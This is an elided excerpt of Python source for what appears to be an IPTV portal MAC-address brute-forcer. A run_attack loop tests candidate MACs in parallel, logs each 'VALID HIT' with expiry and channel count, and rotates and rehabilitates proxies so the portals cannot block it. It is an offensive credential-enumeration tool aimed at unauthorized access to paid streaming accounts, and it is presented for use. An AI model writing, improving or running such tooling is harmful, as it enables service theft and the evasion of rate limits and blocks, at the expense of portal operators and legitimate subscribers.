...
host = os.getenv("HOST", "0.0.0.0:5004")
...
class ProxyScorer:
    ...
    def record_fail(self, proxy, error_type, portal=None):
        ...
        with self.lock:
            ...
            if error_type == "slow":
                s["slow"] += 1
                s["speed"] = min(s["speed"] * 1.2, 20000)  # FIXED: Less aggressive speed penalty
            elif error_type == "blocked" and portal:
                s["blocked"].add(portal)
            elif error_type == "dead":
                s["speed"] = min(s["speed"] * 2, 30000)  # FIXED: Less aggressive dead penalty
    ...
    def get_next_proxy(self, proxies, portal=None, max_errors=3, rotation_percentage=50):
        """
        ...
        with self.lock:
            ...
            # Take configurable percentage of proxies for rotation (at least 5)
    ...
    def rehabilitate_dead_proxies(self, max_age_minutes=30):
        """Reset proxies that have been 'dead' for too long - give them another chance."""
        with self.lock:
            current_time = time.time()
            rehabilitated = 0
            for proxy, s in self.scores.items():
                # If proxy has been marked as dead for more than max_age_minutes, give it another chance
                if (s["consecutive_fails"] >= 5 and 
                    current_time - s.get("last_used", 0) > max_age_minutes * 60):
                    s["consecutive_fails"] = 2  # Reset but keep some penalty
                    s["speed"] = min(s["speed"], 15000)  # Cap speed penalty
                    rehabilitated += 1
...
def run_attack(portal_id):
    ...
    with ThreadPoolExecutor(max_workers=speed) as executor:
        ...
        while state["running"]:
            ...
            # Periodic proxy rehabilitation (every 5 minutes)
            if time.time() - last_settings_reload > 300:  # 5 minutes
                if use_proxies and proxies:
                    rehabilitated = proxy_scorer.rehabilitate_dead_proxies()
                    if rehabilitated > 0:
                        add_log(state, f"♻️ Rehabilitated {rehabilitated} dead proxies", "info")
            ...
            while len(futures) < speed and state["running"] and (not list_done or retry_queue):
                ...
                if use_proxies and proxies:
                    proxy = proxy_scorer.get_next_proxy(proxies, portal_url, max_proxy_errors, 
                                                       settings.get("proxy_rotation_percentage", 50))
                    
                    # Avoid same proxy that just failed - try harder to find alternative
                    if proxy == last_proxy and len(proxies) > 1:
                        for attempt in range(min(10, len(proxies))):  # Try up to 10 different proxies
                ...
                future = executor.submit(test_mac_worker, portal_url, mac, proxy, timeout, 
                                        settings.get("proxy_connect_timeout", 5))
            ...
            for future in done:
                ...
                try:
                    ...
                    if success:
                        # === HIT! Token received + Channels validated ===
                        state["tested"] += 1
                        state["hits"] += 1
                        ...
                        add_log(state, f"🎯 VALID HIT! {mac} - {expiry} - {channels}ch{de_icon}", "success")
                        ...
                        # Determine if we should retry based on settings
                        if unlimited_retries:
                            should_retry = True  # Try until all proxies exhausted
                        else:
                            # Use the more specific max_proxy_attempts setting if available
                            max_attempts = max_proxy_attempts if max_proxy_attempts > max_retries else max_retries
                        ...
                        if should_retry:
                            ...
                            if new_retry_count <= 3:  # Only log first few attempts to avoid spam
                                add_log(state, f"🔄 Retry {new_retry_count}: {mac} (proxy failed: {error_type})", "warning")
                        else:
                            state["tested"] += 1
                            state["errors"] += 1
                            add_log(state, f"✗ {mac} - tried {new_retry_count} proxies, giving up", "error")
                    
                    else:
                        # === Portal validation failed ===
                        # Could be: No token, insufficient channels, or other portal error
                        state["tested"] += 1
                        if proxy:
                            proxy_scorer.record_success(proxy, elapsed_ms)
                        ...
                        if "channels" in error_msg.lower():
                            add_log(state, f"📺 {mac} - {error_msg}", "warning")
                        elif "compatible mode" in error_msg.lower():
                            add_log(state, f"🔄 {mac} - Invalid (compatible mode)", "info")
                        # Don't log every invalid MAC to avoid spam
...
def test_mac_worker(portal_url, mac, proxy, timeout, connect_timeout=5):
    """
    Test MAC - Optimized 3-Phase approach:
    - Phase 1: Quick Scan (handshake) → Token received?
    - Phase 2: Quick Validation (channels) → Has enough channels?
    - Phase 3: Full Scan (details) → Collect all data (only for valid MACs)
    - Returns (success, result, error_type)
    
    error_type: None (success or portal said no), "dead", "slow", "blocked"
    """
    try:
        # Get settings for enhanced validation
        settings = get_settings()
        ...
        success, result = stb.test_mac(portal_url, mac, proxy, timeout, connect_timeout, 
